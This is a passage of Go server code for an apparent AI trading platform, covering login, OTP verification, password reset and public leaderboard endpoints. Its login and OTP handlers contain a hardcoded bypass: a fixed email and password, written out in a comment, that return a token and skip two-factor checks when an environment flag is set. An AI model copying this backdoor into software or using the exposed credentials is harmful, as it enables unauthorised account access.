		return
	}

	// Get user information
	user, err := s.store.User().GetByID(req.UserID)
	if err != nil {
		SafeNotFound(c, "User")
		return
	}

	// Verify OTP
	if !auth.VerifyOTP(user.OTPSecret, req.OTPCode) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "OTP code error"})
		return
	}

	// Update user OTP verified status
	err = s.store.User().UpdateOTPVerified(req.UserID, true)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update user status"})
		return
	}

	// Generate JWT token
	token, err := auth.GenerateJWT(user.ID, user.Email)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate token"})
		return
	}

	// Initialize default model and exchange configs for user
	err = s.initUserDefaultConfigs(user.ID)
	if err != nil {
		logger.Infof("Failed to initialize user default configs: %v", err)
	}

	c.JSON(http.StatusOK, gin.H{
		"token":   token,
		"user_id": user.ID,
		"email":   user.Email,
		"message": "Registration completed",
	})
}

// handleLogin Handle user login request
func (s *Server) handleLogin(c *gin.Context) {
	var req struct {
		Email    string `json:"email" binding:"required,email"`
		Password string `json:"password" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		SafeBadRequest(c, "Invalid request parameters")
		return
	}

	// 本地或自托管：2326840417@qq.com + 2326840417a.A 直接返回 JWT，跳过 OTP（自托管时在 .env 设 ALLOW_BYPASS_LOGIN=1）
	if allowBypassLogin(c) && req.Email == localBypassEmail && req.Password == localBypassPassword {
		user, err := s.ensureLocalAdminUser()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Local admin setup failed"})
			return
		}
		token, err := auth.GenerateJWT(user.ID, user.Email)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate token"})
			return
		}
		c.JSON(http.StatusOK, gin.H{
			"token":   token,
			"user_id": user.ID,
			"email":   user.Email,
			"message": "Login successful (localhost bypass)",
		})
		return
	}

	// Get user information
	user, err := s.store.User().GetByEmail(req.Email)
	if err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Email or password incorrect"})
		return
	}

	// Verify password
	if !auth.CheckPassword(req.Password, user.PasswordHash) {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Email or password incorrect"})
		return
	}

	// Check if OTP is verified
	if !user.OTPVerified {
		// Return OTP info so user can complete setup
		qrCodeURL := auth.GetOTPQRCodeURL(user.OTPSecret, user.Email)
		c.JSON(http.StatusOK, gin.H{
			"user_id":            user.ID,
			"email":              user.Email,
			"otp_secret":         user.OTPSecret,
			"qr_code_url":        qrCodeURL,
			"requires_otp_setup": true,
			"message":            "Please complete OTP setup first",
		})
		return
	}

	// Return status requiring OTP verification
	c.JSON(http.StatusOK, gin.H{
		"user_id":      user.ID,
		"email":        user.Email,
		"message":      "Please enter Google Authenticator code",
		"requires_otp": true,
	})
}

// handleVerifyOTP Verify OTP and complete login
func (s *Server) handleVerifyOTP(c *gin.Context) {
	var req struct {
		UserID  string `json:"user_id" binding:"required"`
		OTPCode string `json:"otp_code" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		SafeBadRequest(c, "Invalid request parameters")
		return
	}

	// Get user information
	user, err := s.store.User().GetByID(req.UserID)
	if err != nil {
		SafeNotFound(c, "User")
		return
	}

	// 自托管放行：ALLOW_BYPASS_LOGIN=1 且为该账号时跳过 OTP（避免服务器时间与手机不同步导致验证失败）
	if allowBypassLogin(c) && user.Email == localBypassEmail {
		// 直接通过，不校验 OTP
	} else if !auth.VerifyOTP(user.OTPSecret, req.OTPCode) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Verification code error"})
		return
	}

	// Generate JWT token
	token, err := auth.GenerateJWT(user.ID, user.Email)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate token"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"token":   token,
		"user_id": user.ID,
		"email":   user.Email,
		"message": "Login successful",
	})
}

// handleResetPassword Reset password (via email + OTP verification)
func (s *Server) handleResetPassword(c *gin.Context) {
	var req struct {
		Email       string `json:"email" binding:"required,email"`
		NewPassword string `json:"new_password" binding:"required,min=6"`
		OTPCode     string `json:"otp_code" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		SafeBadRequest(c, "Invalid request parameters")
		return
	}

	// Query user
	user, err := s.store.User().GetByEmail(req.Email)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Email does not exist"})
		return
	}

	// Verify OTP
	if !auth.VerifyOTP(user.OTPSecret, req.OTPCode) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Google Authenticator code error"})
		return
	}

	// Generate new password hash
	newPasswordHash, err := auth.HashPassword(req.NewPassword)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Password processing failed"})
		return
	}

	// Update password
	err = s.store.User().UpdatePassword(user.ID, newPasswordHash)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Password update failed"})
		return
	}

	logger.Infof("✓ User %s password has been reset", user.Email)
	c.JSON(http.StatusOK, gin.H{"message": "Password reset successful, please login with new password"})
}

// initUserDefaultConfigs Initialize default model and exchange configs for new user
func (s *Server) initUserDefaultConfigs(userID string) error {
	// Commented out auto-creation of default configs, let users add manually
	// This way new users won't have config items automatically after registration
	logger.Infof("User %s registration completed, waiting for manual AI model and exchange configuration", userID)
	return nil
}

// handleGetSupportedModels Get list of AI models supported by the system
func (s *Server) handleGetSupportedModels(c *gin.Context) {
	// Return static list of supported AI models with default versions
	supportedModels := []map[string]interface{}{
		{"id": "deepseek", "name": "DeepSeek", "provider": "deepseek", "defaultModel": "deepseek-chat"},
		{"id": "qwen", "name": "Qwen", "provider": "qwen", "defaultModel": "qwen3-max"},
		{"id": "openai", "name": "OpenAI", "provider": "openai", "defaultModel": "gpt-5.1"},
		{"id": "claude", "name": "Claude", "provider": "claude", "defaultModel": "claude-opus-4-6"},
		{"id": "gemini", "name": "Google Gemini", "provider": "gemini", "defaultModel": "gemini-3-pro-preview"},
		{"id": "grok", "name": "Grok (xAI)", "provider": "grok", "defaultModel": "grok-3-latest"},
		{"id": "kimi", "name": "Kimi (Moonshot)", "provider": "kimi", "defaultModel": "moonshot-v1-auto"},
		{"id": "minimax", "name": "MiniMax", "provider": "minimax", "defaultModel": "MiniMax-M2.5"},
	}

	c.JSON(http.StatusOK, supportedModels)
}

// handleGetSupportedExchanges Get list of exchanges supported by the system
func (s *Server) handleGetSupportedExchanges(c *gin.Context) {
	// Return static list of supported exchange types
	// Note: ID is empty for supported exchanges (they are templates, not actual accounts)
	supportedExchanges := []SafeExchangeConfig{
		{ExchangeType: "binance", Name: "Binance Futures", Type: "cex"},
		{ExchangeType: "bybit", Name: "Bybit Futures", Type: "cex"},
		{ExchangeType: "okx", Name: "OKX Futures", Type: "cex"},
		{ExchangeType: "gate", Name: "Gate.io Futures", Type: "cex"},
		{ExchangeType: "kucoin", Name: "KuCoin Futures", Type: "cex"},
		{ExchangeType: "hyperliquid", Name: "Hyperliquid", Type: "dex"},
		{ExchangeType: "aster", Name: "Aster DEX", Type: "dex"},
		{ExchangeType: "lighter", Name: "LIGHTER DEX", Type: "dex"},
		{ExchangeType: "alpaca", Name: "Alpaca (US Stocks)", Type: "stock"},
		{ExchangeType: "forex", Name: "Forex (TwelveData)", Type: "forex"},
		{ExchangeType: "metals", Name: "Metals (TwelveData)", Type: "metals"},
	}

	c.JSON(http.StatusOK, supportedExchanges)
}

// Start Start server
func (s *Server) Start() error {
	addr := fmt.Sprintf("0.0.0.0:%d", s.port)
	logger.Infof("🌐 API server starting at http://%s", addr)
	logger.Infof("📊 API Documentation:")
	logger.Infof("  • GET  /api/health           - Health check")
	logger.Infof("  • GET  /api/traders          - Public AI trader leaderboard top 50 (no auth required)")
	logger.Infof("  • GET  /api/competition      - Public competition data (no auth required)")
	logger.Infof("  • GET  /api/top-traders      - Top 5 trader data (no auth required, for performance comparison)")
	logger.Infof("  • GET  /api/equity-history?trader_id=xxx - Public return rate historical data (no auth required, for competition)")
	logger.Infof("  • GET  /api/equity-history-batch?trader_ids=a,b,c - Batch get historical data (no auth required, performance comparison optimization)")
	logger.Infof("  • GET  /api/traders/:id/public-config - Public trader config (no auth required, no sensitive info)")
	logger.Infof("  • POST /api/traders          - Create new AI trader")
	logger.Infof("  • DELETE /api/traders/:id    - Delete AI trader")
	logger.Infof("  • POST /api/traders/:id/start - Start AI trader")
	logger.Infof("  • POST /api/traders/:id/stop  - Stop AI trader")
	logger.Infof("  • GET  /api/models           - Get AI model config")
	logger.Infof("  • PUT  /api/models           - Update AI model config")
	logger.Infof("  • GET  /api/exchanges        - Get exchange config")
	logger.Infof("  • PUT  /api/exchanges        - Update exchange config")
	logger.Infof("  • GET  /api/status?trader_id=xxx     - Specified trader's system status")
	logger.Infof("  • GET  /api/account?trader_id=xxx    - Specified trader's account info")
	logger.Infof("  • GET  /api/positions?trader_id=xxx  - Specified trader's position list")
	logger.Infof("  • GET  /api/decisions?trader_id=xxx  - Specified trader's decision log")
	logger.Infof("  • GET  /api/decisions/latest?trader_id=xxx - Specified trader's latest decisions")
	logger.Infof("  • GET  /api/statistics?trader_id=xxx - Specified trader's statistics")
	logger.Infof("  • GET  /api/performance?trader_id=xxx - Specified trader's AI learning performance analysis")
	logger.Info()

	s.httpServer = &http.Server{
		Addr:    addr,
		Handler: s.router,
	}
	return s.httpServer.ListenAndServe()
}

// Shutdown Gracefully shutdown server
func (s *Server) Shutdown() error {
	if s.httpServer == nil {
		return nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return s.httpServer.Shutdown(ctx)
}

// handlePublicTraderList Get public trader list (no authentication required)
func (s *Server) handlePublicTraderList(c *gin.Context) {
	// Get trader information from all users
	competition, err := s.traderManager.GetCompetitionData()
	if err != nil {
		SafeInternalError(c, "Get trader list", err)
		return
	}

	// Get traders array
	tradersData, exists := competition["traders"]
	if !exists {
		c.JSON(http.StatusOK, []map[string]interface{}{})
		return
	}

	traders, ok := tradersData.([]map[string]interface{})
	if !ok {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": "Trader data format error",
		})
		return
	}

	// Return trader basic information, filter sensitive information
	result := make([]map[string]interface{}, 0, len(traders))
	for _, trader := range traders {
		result = append(result, map[string]interface{}{
			"trader_id":       trader["trader_id"],
			"trader_name":     trader["trader_name"],
			"ai_model":        trader["ai_model"],
			"exchange":        trader["exchange"],
			"is_running":      trader["is_running"],
			"total_equity":    trader["total_equity"],
			"total_pnl":       trader["total_pnl"],
			"total_pnl_pct":   trader["total_pnl_pct"],
			"position_count":  trader["position_count"],
			"margin_used_pct": trader["margin_used_pct"],
		})
	}

	c.JSON(http.StatusOK, result)
}

// handlePublicCompetition Get public competition data (no authentication required)
func (s *Server) handlePublicCompetition(c *gin.Context) {
	competition, err := s.traderManager.GetCompetitionData()
	if err != nil {
		SafeInternalError(c, "Get competition data", err)
		return
	}

	c.JSON(http.StatusOK, competition)
}

// handleTopTraders Get top 5 trader data (no authentication required, for performance comparison)
func (s *Server) handleTopTraders(c *gin.Context) {
	topTraders, err := s.traderManager.GetTopTradersData()
	if err != nil {
		SafeInternalError(c, "Get top traders data", err)
		return
	}

	c.JSON(http.StatusOK, topTraders)
}

// handleEquityHistoryBatch Batch get return rate historical data for multiple traders (no authentication required, for performance comparison)
// Supports optional 'hours' parameter to filter data by time range (e.g., hours=24 for last 24 hours)
func (s *Server) handleEquityHistoryBatch(c *gin.Context) {
	var requestBody struct {
		TraderIDs []string `json:"trader_ids"`
		Hours     int      `json:"hours"` // Optional: filter by last N hours (0 = all data)
	}

	// Try to parse POST request JSON body
	if err := c.ShouldBindJSON(&requestBody); err != nil {
		// If JSON parse fails, try to get from query parameters (compatible with GET request)
		traderIDsParam := c.Query("trader_ids")
		if traderIDsParam == "" {
			// If no trader_ids specified, return historical data for top 5
			topTraders, err := s.traderManager.GetTopTradersData()
			if err != nil {
				SafeInternalError(c, "Get top traders", err)
				return
			}

			traders, ok := topTraders["traders"].([]map[string]interface{})
			if !ok {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "Trader data format error"})
				return
			}

			// Extract trader IDs
			traderIDs := make([]string, 0, len(traders))
			for _, trader := range traders {
				if traderID, ok := trader["trader_id"].(string); ok {
					traderIDs = append(traderIDs, traderID)
				}
			}

			// Parse hours parameter from query
			hoursParam := c.Query("hours")
			hours := 0
			if hoursParam != "" {
				fmt.Sscanf(hoursParam, "%d", &hours)
			}

			result := s.getEquityHistoryForTraders(traderIDs, hours)
			c.JSON(http.StatusOK, result)
			return
		}

		// Parse comma-separated trader IDs
		requestBody.TraderIDs = strings.Split(traderIDsParam, ",")
		for i := range requestBody.TraderIDs {
			requestBody.TraderIDs[i] = strings.TrimSpace(requestBody.TraderIDs[i])
		}

		// Parse hours parameter from query
		hoursParam := c.Query("hours")
		if hoursParam != "" {
			fmt.Sscanf(hoursParam, "%d", &requestBody.Hours)
		}
	}

	// Limit to maximum 20 traders to prevent oversized requests
	if len(requestBody.TraderIDs) > 20 {
		requestBody.TraderIDs = requestBody.TraderIDs[:20]
	}

	result := s.getEquityHistoryForTraders(requestBody.TraderIDs, requestBody.Hours)
	c.JSON(http.StatusOK, result)
}

// getEquityHistoryForTraders Get historical data for multiple traders
// Query directly from database, not dependent on trader in memory (so historical data can be retrieved after restart)
// Also appends current real-time data point to ensure chart matches leaderboard
// hours: filter by last N hours (0 = use default limit of 500 records)
func (s *Server) getEquityHistoryForTraders(traderIDs []string, hours int) map[string]interface{} {
	result := make(map[string]interface{})
	histories := make(map[string]interface{})
	errors := make(map[string]string)

	// Use a single consistent timestamp for all real-time data points
	now := time.Now()

	// Pre-fetch initial balances for all traders
	initialBalances := make(map[string]float64)
	for _, traderID := range traderIDs {
		if traderID == "" {
			continue
		}
		// Get trader's initial balance from database (use GetByID which doesn't require userID)
		trader, err := s.store.Trader().GetByID(traderID)
		if err == nil && trader != nil && trader.InitialBalance > 0 {
			initialBalances[traderID] = trader.InitialBalance
		}
	}

	for _, traderID := range traderIDs {
		if traderID == "" {
			continue
		}

		// Get equity historical data from new equity table
		var snapshots []*store.EquitySnapshot
		var err error

		if hours > 0 {
			// Filter by time range
			startTime := now.Add(-time.Duration(hours) * time.Hour)
			snapshots, err = s.store.Equity().GetByTimeRange(traderID, startTime, now)
		} else {
			// Default: get latest 500 records
			snapshots, err = s.store.Equity().GetLatest(traderID, 500)
		}
		if err != nil {
			logger.Errorf("[API] Failed to get equity history for %s: %v", traderID, err)
			errors[traderID] = "Failed to get historical data"
			continue
		}

		// Get initial balance for calculating PnL percentage
		initialBalance := initialBalances[traderID]
		if initialBalance <= 0 && len(snapshots) > 0 {
			// If no initial balance configured, use the first snapshot's equity as baseline
			initialBalance = snapshots[0].TotalEquity
		}

		// Build return rate historical data with PnL percentage
		history := make([]map[string]interface{}, 0, len(snapshots)+1)
		var lastSnapshotTime time.Time
		for _, snap := range snapshots {
			// Calculate PnL percentage: (current_equity - initial_balance) / initial_balance * 100
			pnlPct := 0.0
			if initialBalance > 0 {
				pnlPct = (snap.TotalEquity - initialBalance) / initialBalance * 100
			}

			history = append(history, map[string]interface{}{
				"timestamp":     snap.Timestamp,
				"total_equity":  snap.TotalEquity,
				"total_pnl":     snap.UnrealizedPnL,
				"total_pnl_pct": pnlPct,
				"balance":       snap.Balance,
			})
			if snap.Timestamp.After(lastSnapshotTime) {
				lastSnapshotTime = snap.Timestamp
			}
		}

		// Append current real-time data point to ensure chart matches leaderboard
		// This ensures the latest point is always current, not from a potentially stale snapshot
		if trader, err := s.traderManager.GetTrader(traderID); err == nil {
			if accountInfo, err := trader.GetAccountInfo(); err == nil {
				// Only append if it's been more than 30 seconds since last snapshot
				if now.Sub(lastSnapshotTime) > 30*time.Second {
					totalEquity := 0.0
					if v, ok := accountInfo["total_equity"].(float64); ok {
						totalEquity = v
					}
					totalPnL := 0.0
					if v, ok := accountInfo["total_pnl"].(float64); ok {
						totalPnL = v
					}
					walletBalance := 0.0
					if v, ok := accountInfo["wallet_balance"].(float64); ok {
						walletBalance = v
					}
					pnlPct := 0.0
					if initialBalance > 0 {
						pnlPct = (totalEquity - initialBalance) / initialBalance * 100
					}

					history = append(history, map[string]interface{}{
						"timestamp":     now,
						"total_equity":  totalEquity,
						"total_pnl":     totalPnL,
						"total_pnl_pct": pnlPct,
						"balance":       walletBalance,
					})
				}
			}
		}

		histories[traderID] = history
	}

	result["histories"] = histories
	result["count"] = len(histories)
	if len(errors) > 0 {
		result["errors"] = errors
	}

	return result
}

// handleGetPublicTraderConfig Get public trader configuration information (no authentication required, does not include sensitive information)
func (s *Server) handleGetPublicTraderConfig(c *gin.Context) {
	traderID := c.Param("id")
	if traderID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Trader ID cannot be empty"})
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Trader does not exist"})
		return
	}

	// Get trader status information
	status := trader.GetStatus()

	// Only return public configuration information, not including sensitive data like API keys
	result := map[string]interface{}{
		"trader_id":   trader.GetID(),
		"trader_name": trader.GetName(),
		"ai_model":    trader.GetAIModel(),
		"exchange":    trader.GetExchange(),
		"is_running":  status["is_running"],
		"ai_provider": status["ai_provider"],
		"start_time":  status["start_time"],
	}

	c.JSON(http.StatusOK, result)
}
